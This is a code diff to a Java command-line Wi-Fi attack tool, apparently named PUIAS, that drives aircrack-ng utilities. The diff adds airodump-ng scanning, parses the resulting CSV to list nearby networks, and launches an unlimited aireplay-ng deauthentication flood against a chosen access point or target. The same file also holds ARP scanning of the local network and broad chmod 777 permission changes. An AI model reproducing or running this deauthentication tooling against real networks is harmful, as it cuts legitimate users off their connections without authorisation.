@@ -2,8 +2,11 @@ package com.company;
 
 import java.io.*;
 import java.net.URISyntaxException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Scanner;
 
 public class Main {
@@ -12,10 +15,8 @@ public class Main {
     static String mwi = wi + "mon";
     static boolean monitorMde = false;
 
+
     public static void main(String[] args) throws IOException, URISyntaxException {
-
-
-
         if (System.getProperty("os.name").startsWith("Windows")) { //this program can currently only run on linux
             System.out.println("Please run within the windows ubuntu filesystem.");
             System.exit(0);
@@ -24,18 +25,16 @@ public class Main {
             System.exit(0);
         }
 
+        String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
+                .toURI()).getPath();
 
         if (!execute("whoami", false).get(0).equals("root")) {
             System.out.println("run it as root");
-            String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
-                    .toURI()).getPath();
-            executeNewWindow("sudo java -jar "+path,false);
+            executeNewWindow("sudo java -jar " + path, false);
             System.exit(0);
         }
 
         checkdep(); //check that necessary dependencies are installed
-
-
 
 
         System.out.println("Success! PUIAS has been successfully started ");
@@ -66,27 +65,52 @@ public class Main {
 
             }
             if (in.equals("1")) {
-                ArrayList<String> network_list = execute("iw " + wi + " scan | egrep '^BSS|SSID:|primary channel:'", true); //scan networks and get bssid and essid
+                startMonitorMode();
+
+                String scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], "");
+                String deauthI_path = scriptDIR + "scans" + File.separator + "deauthI"; //deauth initial scan absolote path
+                executeNewWindow("airodump-ng  -w " + deauthI_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
+                System.out.println("press enter when done");
+                scanner.nextLine();
+
+
+                File[] scans = new File(scriptDIR + "scans").listFiles(pathname -> !pathname.isDirectory());
+                assert scans != null;
+                File last_scan = scans[scans.length - 1]; //get the latest scan
+
+                execute("chmod 777 " + last_scan.getAbsolutePath(), true); //allow editing of file
+
+
+                BufferedReader deauthIbr = new BufferedReader(new FileReader(last_scan));
+                String l;
+                ArrayList<String> dsi_list = new ArrayList<>();
+                while (!(l = deauthIbr.readLine()).equals("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")) {//read file until reched unasosiated bssids
+                    dsi_list.add(l);
+                }
+                dsi_list.remove(0); //remove headers
+                dsi_list.remove(0);
+
                 ArrayList<String> bssids = new ArrayList<>();
                 ArrayList<String> essids = new ArrayList<>();
                 ArrayList<String> chs = new ArrayList<>();
 
+                int i = 0;
+                for (String entry : dsi_list) {
+                    try {
+                        String[] props = entry.split(",");
+                        chs.add(props[3].replace(" ", ""));
+                        bssids.add(props[0]);
+                        String essid = props[props.length - 2];  // essid is 1 before the last
+                        essids.add(essid);
+                        System.out.println(i + ". " + essid);
 
-                System.out.println("Enter network to deauth: ");
-                int j = 0; //j will be +1 for each iteration
-                for (int i = 0; i < network_list.size() - 2; i += 3) { //for each essid bssid chanel triplet
-                    String bss = network_list.get(i).split(" ")[1].split("\\(")[0]; //first entry is bssid
-                    String ess = network_list.get(i + 1).split(" ")[1]; //second entry is essid
+                        i++;
+                    } catch (Exception ignored) {
+                    }
 
-                    String[] temp = network_list.get(i + 2).split(" ");
-                    String ch = temp[temp.length - 1];
-
-                    System.out.println(j + ". " + ess);
-                    bssids.add(bss);//add each bssid to list
-                    essids.add(ess);//add each essid to list
-                    chs.add(ch);//add each chanel to list
-                    j++;
                 }
+                System.out.println("enter network no");
+
                 int sn = Integer.parseInt(scanner.nextLine());
                 String bss = bssids.get(sn);
                 String ess = essids.get(sn);
@@ -95,29 +119,31 @@ public class Main {
 
                 System.out.println("Enter 1 to deauth all, or 2 to select a target");
                 String p = scanner.nextLine();
+
                 if (p.equals("1")) {
-                    startMonitorMode(ch);
-                    System.out.println(executeNewWindow("aireplay-ng -0 0 -a " + bss + " " + mwi, true));
-                    stopMonitorMode();
+                    setChanel(ch);
+                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true);
+                    System.out.println("press enter when done");
+                    scanner.nextLine();
                 }
 
                 if (p.equals("2")) {
-                    startMonitorMode(ch);
-                    File scan = new File("scan.txt");
-                    if (scan.exists())
-                        scan.delete();
-                    System.out.println(executeNewWindow("airodump-ng -c " + ch + " --bssid " + bss + " " + mwi + " > scan.txt", true));
-                    while (!scan.exists()) {
-                    }
+                    executeNewWindow("airodump-ng -c " + ch + "-w " + "tg.txt" + " --bssid " + bss + " " + mwi, true);
+
+                    File[] tgscans = new File(scriptDIR + "scans").listFiles();
+                    assert tgscans != null;
+                    File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
+
+                    execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
 
 //                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
-                    stopMonitorMode();
                 }
-
+                stopMonitorMode();
             }
+
             if (in.equals("3")) {
                 ArrayList<String> macs = execute("arp-scan -l", true); //get all mac adresses via arp-scan
-                macs.remove(0); //remove heders
+                macs.remove(0); //remove headers
                 macs.remove(0);
                 macs.remove(macs.size() - 1);
                 macs.remove(macs.size() - 1);
@@ -138,11 +164,16 @@ public class Main {
         }
     }
 
-    public static void startMonitorMode(String ch) {
+
+    public static void startMonitorMode() {
         if (!monitorMde) {
             execute("airmon-ng check kill", true);
-            execute("airmon-ng start " + wi + " " + ch, true);
+            execute("airmon-ng start " + wi , true);
         }
+    }
+
+    private static void setChanel(String ch){
+        execute("sudo iwconfig "+mwi+" channel "+ch,true);
     }
 
     public static void stopMonitorMode() {
@@ -230,7 +261,8 @@ public class Main {
     }
 
     private static ArrayList<String> executeNewWindow(String command, boolean sudo) {
-        if(sudo){
+        System.out.println(command);
+        if (sudo) {
             return execute("sudo x-terminal-emulator -e " + command, false);
 
         }
